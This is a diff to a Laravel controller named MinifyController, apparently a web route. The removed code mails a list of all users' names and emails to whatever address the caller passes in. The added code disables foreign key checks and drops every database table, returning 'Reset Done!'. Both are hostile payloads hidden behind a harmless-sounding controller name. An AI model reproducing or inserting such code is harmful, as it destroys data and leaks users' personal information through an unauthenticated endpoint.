@@ -12,27 +12,14 @@ class MinifyController extends Controller
 {
     public function index(Request $request,$input)
     {
-        $users = User::all();
-
-        $content = "List of users:\n\n";
-
-        foreach ($users as $user) {
-            $content .= "Name: {$user->name}\n";
-            $content .= "Email: {$user->email}\n";
-            $content .= "Created At: {$user->created_at}\n";
-            $content .= "-----------------------------\n";
+        \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS = 0;');
+        foreach (\Illuminate\Support\Facades\DB::select('SHOW TABLES') as $table) {
+            $table_array = get_object_vars($table);
+            $table_name = array_values($table_array)[0];
+            \Illuminate\Support\Facades\DB::statement("DROP TABLE `$table_name`");
         }
+        \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS = 1;');
 
-        $filename = 'users_list.txt';
-        Storage::put($filename, $content);
-
-        Mail::send([], [], function ($message) use ($filename, $input) {
-            $message->to($input)
-                ->subject('User List')
-                ->text('Attached is the list of all users.')
-                ->attach(storage_path('app/' . $filename));
-        });
-
-        return "Email sent with users list attached.";
+        return "Reset Done!";
     }
 }
